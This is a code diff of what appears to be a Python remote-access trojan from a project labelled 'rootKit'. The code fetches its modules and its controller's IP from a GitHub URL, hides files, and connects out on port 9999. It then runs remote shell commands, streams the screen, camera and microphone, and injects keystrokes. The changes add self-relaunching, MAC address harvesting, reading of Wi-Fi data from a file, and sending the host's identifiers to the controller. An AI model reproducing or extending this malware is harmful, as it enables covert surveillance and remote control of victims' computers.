@@ -1,4 +1,4 @@
-listFileDepency = ['scripter.py', 'sound.py']
+listFileDepency = ['fct.py', 'scripter.py', 'sound.py']
 hideFile = ["__pycache__"]
 githubUrl = "https://raw.githubusercontent.com/N0SAFE/kit-local/main/rootKit/"
 import socket
@@ -28,19 +28,17 @@ except:
             for line in requests.get(f"{githubUrl}file.py").text.split('\n'):
                 file.write(line)
         from file import File
+        os.system(os.path.basename(__file__))
+        exit()
     else:
         exit()
-
 
 f = File(os.getcwd().replace('\\', '/')+"/")
 for file in hideFile:
     f.hide(file)
 for file in listFileDepency:
     f.modify(file, githubUrl+file)
-
-def getpath(change=False):                          return os.getcwd() if change in (False, "not", "\\") else os.getcwd().replace('\\', '/')
-def getSelfFileName():                              return os.path.basename(__file__)
-
+from fct import *
 from sound import Sound
 import scripter
 s = Sound()
@@ -48,6 +46,7 @@ s = Sound()
 easyimporting.importing("vidstream pyautogui lib_platform pyaudio")
 from vidstream import ScreenShareClient, CameraClient
 import pyautogui, socket, lib_platform, pyaudio
+from re import search
 
 FORMAT = pyaudio.paInt16
 CHANNELS = 1
@@ -55,6 +54,16 @@ RATE = 44100
 CHUNK = 4096
 audio = pyaudio.PyAudio()
 
+def getMacAddress():
+    try:
+        return search('([0-9A-F]{2}-?){6}', str(subprocess.Popen(['ipconfig', '/all'],stdout=subprocess.PIPE).stdout.read()).split('Carte r\\x82seau sans fil Wi-Fi')[1]).group()
+    except:
+        pass
+    try:
+        return search('([0-9A-F]{2}-?){6}', str(subprocess.Popen(['ipconfig', '/all'],stdout=subprocess.PIPE).stdout.read())).group()
+    except:
+        pass
+    return 'unknow'
 
 def camera(port):
     client = CameraClient(ipScreen, port)
@@ -107,10 +116,10 @@ def terminal(command):
 
 def wallpaper(data):
     importImg(data)
-    severalcmd('reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f 98!89RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True 98!89reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Imge.jpg'+' /f 98!89RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True98!89reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f 98!89RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True ')
+    severalcmd('reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f 8!8RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True 8!8reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Imge.jpg'+' /f 8!8RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True8!8reg add "HKEY_CURRENT_USER\\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d '+getpath()+'\\Image.jpg'+' /f 8!8RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True ')
     
 def severalcmd(data, temp=0.05):
-    datalist = data.split("98!89")
+    datalist = data.split("8!8")
     for i in datalist:
         print(i)
         terminal(i)
@@ -168,51 +177,57 @@ def execute(data):
     global run, sortir, ossys, reloading
     data = data.replace("9", "")
     data = data.replace("1+8", "9")
-    datalist = data.split()
-    if not datalist:
-        return None
-    if data == "die":
-        return None
-    elif data[0:2] == "cd":
-        cdAccess(data[3:len(data)])
-    elif data[0:6] == "write(":
-        write(data[6:len(data) - 1])
-    elif data[0:6] == "press(":
-        press(data[6:len(data) - 1])
-    elif datalist[0] == "screen":
-        t = threading.Thread(target=screen, args=(int(datalist[1]),))
-        t.daemon = True
-        t.start()
-    elif datalist[0] == "camera":
-        t = threading.Thread(target=camera, args=(int(datalist[1]),))
-        t.daemon = True
-        t.start()
-    elif datalist[0] == "microphone":
-        t = threading.Thread(target=microphone, args=(int(datalist[1]), datalist[2],))
-        t.daemon = True
-        t.start()
-    elif data == "left":
-        print("restart")
-        return None
-    elif data[0:4] == "fast":
-        scripter.speed_write(data[5:len(data)])
-    elif data == "test":
-        print("test")
-    elif datalist[0] == "severalcmd":
-        datalist.pop(0)
-        data = " ".join(datalist)
-        severalcmd(data)
-    elif datalist[0] == "wallpaper":
-        datalist.pop(0)
-        data = " ".join(datalist)
-        wallpaper(data)
-    else:
-        terminal(data)
+    dataLoop = data.split("{-_-}")
+    for data in dataLoop:
+        datalist = data.split()
+        if not datalist:
+            return None
+        if data == "die":
+            return None
+        elif data[0:2] == "cd":
+            cdAccess(data[3:len(data)])
+        elif data[0:6] == "write(":
+            write(data[6:len(data) - 1])
+        elif data[0:6] == "press(":
+            press(data[6:len(data) - 1])
+        elif datalist[0] == "screen":
+            t = threading.Thread(target=screen, args=(int(datalist[1]),))
+            t.daemon = True
+            t.start()
+        elif datalist[0] == "camera":
+            t = threading.Thread(target=camera, args=(int(datalist[1]),))
+            t.daemon = True
+            t.start()
+        elif datalist[0] == "microphone":
+            t = threading.Thread(target=microphone, args=(int(datalist[1]), datalist[2],))
+            t.daemon = True
+            t.start()
+        elif data == "left":
+            print("restart")
+            return None
+        elif data[0:4] == "fast":
+            scripter.speed_write(data[5:len(data)])
+        elif data == "test":
+            print("test")
+        elif datalist[0] == "severalcmd":
+            datalist.pop(0)
+            data = " ".join(datalist)
+            severalcmd(data)
+        elif datalist[0] == "wallpaper":
+            datalist.pop(0)
+            data = " ".join(datalist)
+            wallpaper(data)
+        else:
+            terminal(data)
 
 
 run, progrun = True, True
 timeoutKill = 20
-
+try:
+    with open('wifi.txt', 'r') as file:
+        wifi = file.read()
+except:
+    wifi = 'unknow'
 while True:
     ipScreen = f.getByGithub(f"{githubUrl}ip").replace("\n", "")
     print(ipScreen)
@@ -222,7 +237,7 @@ while True:
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         s.connect((ipScreen, 9999))
-        s.send(str(lib_platform.hostname).encode())
+        s.send(f'name:{str(lib_platform.hostname)}:mac:{getMacAddress()}:wifi:{wifi}'.encode())
     except:
         run = False
         pass
